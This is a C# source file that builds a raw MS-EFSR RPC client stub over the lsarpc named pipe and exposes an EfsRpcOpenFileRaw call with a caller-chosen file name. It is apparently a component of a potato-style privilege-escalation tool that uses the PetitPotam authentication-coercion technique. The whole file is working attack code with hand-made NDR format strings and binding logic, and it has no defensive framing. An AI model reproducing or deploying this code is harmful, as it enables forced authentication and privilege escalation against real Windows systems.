using System;
using System.Runtime.InteropServices;

namespace CLR_module;

internal class EfsrTiny
{
	private delegate IntPtr allocmemory(int size);

	private delegate void freememory(IntPtr memory);

	private static byte[] MIDL_ProcFormatStringx86 = new byte[56]
	{
		0, 0, 0, 72, 0, 0, 0, 0, 0, 0,
		20, 0, 50, 0, 0, 0, 8, 0, 64, 0,
		70, 4, 8, 1, 0, 0, 0, 0, 0, 0,
		16, 1, 4, 0, 6, 0, 11, 1, 8, 0,
		12, 0, 72, 0, 12, 0, 8, 0, 112, 0,
		16, 0, 8, 0, 0, 0
	};

	private static byte[] MIDL_ProcFormatStringx64 = new byte[58]
	{
		0, 0, 0, 72, 0, 0, 0, 0, 0, 0,
		40, 0, 50, 0, 0, 0, 8, 0, 64, 0,
		70, 4, 10, 1, 0, 0, 0, 0, 0, 0,
		0, 0, 16, 1, 8, 0, 6, 0, 11, 1,
		16, 0, 12, 0, 72, 0, 24, 0, 8, 0,
		112, 0, 32, 0, 8, 0, 0, 0
	};

	private static byte[] MIDL_TypeFormatStringx86 = new byte[18]
	{
		0, 0, 0, 0, 17, 4, 2, 0, 48, 160,
		0, 0, 17, 8, 37, 92, 0, 0
	};

	private static byte[] MIDL_TypeFormatStringx64 = new byte[18]
	{
		0, 0, 0, 0, 17, 4, 2, 0, 48, 160,
		0, 0, 17, 8, 37, 92, 0, 0
	};

	private Guid interfaceId;

	private byte[] MIDL_ProcFormatString;

	private byte[] MIDL_TypeFormatString;

	private GCHandle procString;

	private GCHandle formatString;

	private GCHandle stub;

	private GCHandle faultoffsets;

	private GCHandle clientinterface;

	private string PipeName;

	private allocmemory AllocateMemoryDelegate = AllocateMemory;

	private freememory FreeMemoryDelegate = FreeMemory;

	public uint RPCTimeOut = 5000u;

	[DllImport("Rpcrt4.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, EntryPoint = "RpcBindingFromStringBindingW")]
	private static extern int RpcBindingFromStringBinding(string bindingString, out IntPtr lpBinding);

	[DllImport("Rpcrt4.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, EntryPoint = "NdrClientCall2")]
	private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);

	[DllImport("Rpcrt4.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
	private static extern int RpcBindingFree(ref IntPtr lpString);

	[DllImport("Rpcrt4.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, EntryPoint = "RpcStringBindingComposeW")]
	private static extern int RpcStringBindingCompose(string ObjUuid, string ProtSeq, string NetworkAddr, string Endpoint, string Options, out IntPtr lpBindingString);

	[DllImport("Rpcrt4.dll", CallingConvention = CallingConvention.StdCall)]
	private static extern int RpcBindingSetOption(IntPtr Binding, uint Option, IntPtr OptionValue);

	[DllImport("Rpcrt4.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, EntryPoint = "NdrClientCall2")]
	internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, out IntPtr hContext, string FileName, int Flags);

    [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
    private static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);

    public EfsrTiny()
	{
		interfaceId = new Guid("c681d488-d850-11d0-8c52-00c04fd90f7e");
		if (IntPtr.Size == 8)
		{
			InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, "\\pipe\\lsarpc", 1, 0);
		}
		else
		{
			InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, "\\pipe\\lsarpc", 1, 0);
		}
	}

	~EfsrTiny()
	{
		freeStub();
	}

	public int EfsRpcOpenFileRaw(out IntPtr hContext, string FileName, int Flags)
	{
		IntPtr intPtr = IntPtr.Zero;
		IntPtr intPtr2 = Marshal.StringToHGlobalUni(FileName);
		hContext = IntPtr.Zero;
		try
		{
			if (IntPtr.Size == 8)
			{
				intPtr = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), out hContext, FileName, Flags);
			}
			else
			{
				IntPtr zero = IntPtr.Zero;
				GCHandle gCHandle = GCHandle.Alloc(zero, GCHandleType.Pinned);
				IntPtr intPtr3 = gCHandle.AddrOfPinnedObject();
				try
				{
					intPtr = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), intPtr3, intPtr2, IntPtr.Zero);
					hContext = Marshal.ReadIntPtr(intPtr3);
				}
				finally
				{
					gCHandle.Free();
				}
			}
		}
		catch (SEHException)
		{
			int exceptionCode = Marshal.GetExceptionCode();
			Console.WriteLine("[x]EfsRpcOpenFileRaw failed: " + exceptionCode);
			return exceptionCode;
		}
		finally
		{
			if (intPtr2 != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(intPtr2);
			}
		}
		return (int)intPtr.ToInt64();
	}

	protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
	{
		this.MIDL_ProcFormatString = MIDL_ProcFormatString;
		this.MIDL_TypeFormatString = MIDL_TypeFormatString;
		PipeName = pipe;
		procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);
		RPC_CLIENT_INTERFACE rPC_CLIENT_INTERFACE = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);
		COMM_FAULT_OFFSETS cOMM_FAULT_OFFSETS = default(COMM_FAULT_OFFSETS);
		cOMM_FAULT_OFFSETS.CommOffset = -1;
		cOMM_FAULT_OFFSETS.FaultOffset = -1;
		faultoffsets = GCHandle.Alloc(cOMM_FAULT_OFFSETS, GCHandleType.Pinned);
		clientinterface = GCHandle.Alloc(rPC_CLIENT_INTERFACE, GCHandleType.Pinned);
		formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);
		MIDL_STUB_DESC mIDL_STUB_DESC = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(), clientinterface.AddrOfPinnedObject(), Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate), Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));
		stub = GCHandle.Alloc(mIDL_STUB_DESC, GCHandleType.Pinned);
	}

	protected void freeStub()
	{
		procString.Free();
		faultoffsets.Free();
		clientinterface.Free();
		formatString.Free();
		stub.Free();
	}

	protected static IntPtr AllocateMemory(int size)
	{
		return Marshal.AllocHGlobal(size);
	}

	protected static void FreeMemory(IntPtr memory)
	{
		Marshal.FreeHGlobal(memory);
	}

	protected IntPtr Bind(IntPtr IntPtrserver)
	{
        string server = Marshal.PtrToStringUni(IntPtrserver);
        string networkAddr = Marshal.PtrToStringUni(IntPtrserver);
		IntPtr lpBindingString = IntPtr.Zero;
		IntPtr lpBinding = IntPtr.Zero;
		int num = RpcStringBindingCompose(interfaceId.ToString(), "ncacn_np", networkAddr, PipeName, null, out lpBindingString);
		if (num != 0)
		{
			Console.WriteLine("[x]RpcStringBindingCompose failed with status 0x" + num.ToString("x"));
			return IntPtr.Zero;
		}
		num = RpcBindingFromStringBinding(Marshal.PtrToStringUni(lpBindingString), out lpBinding);
		RpcBindingFree(ref lpBindingString);
		if (num != 0)
		{
			Console.WriteLine("[x]RpcBindingFromStringBinding failed with status 0x" + num.ToString("x"));
			return IntPtr.Zero;
		}

        num = RpcBindingSetAuthInfo(lpBinding, server, /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */ 6, /* RPC_C_AUTHN_GSS_NEGOTIATE */ 9, IntPtr.Zero, AuthzSvc: 16);
        if (num != 0)
        {
            Console.WriteLine("[x] RpcBindingSetAuthInfo failed with status 0x" + num.ToString("x"));
        }
        num = RpcBindingSetOption(lpBinding, 12u, new IntPtr(RPCTimeOut));
		if (num != 0)
		{
			Console.WriteLine("[x]RpcBindingSetOption failed with status 0x" + num.ToString("x"));
		}
		Console.WriteLine("[!]binding ok (handle=" + lpBinding.ToString("x") + ")");
		return lpBinding;
	}

	protected IntPtr GetProcStringHandle(int offset)
	{
		return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
	}

	protected IntPtr GetStubHandle()
	{
		return stub.AddrOfPinnedObject();
	}

	protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
	{
		GCHandle gCHandle = GCHandle.Alloc(args, GCHandleType.Pinned);
		try
		{
			return NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), gCHandle.AddrOfPinnedObject());
		}
		finally
		{
			gCHandle.Free();
		}
	}
}
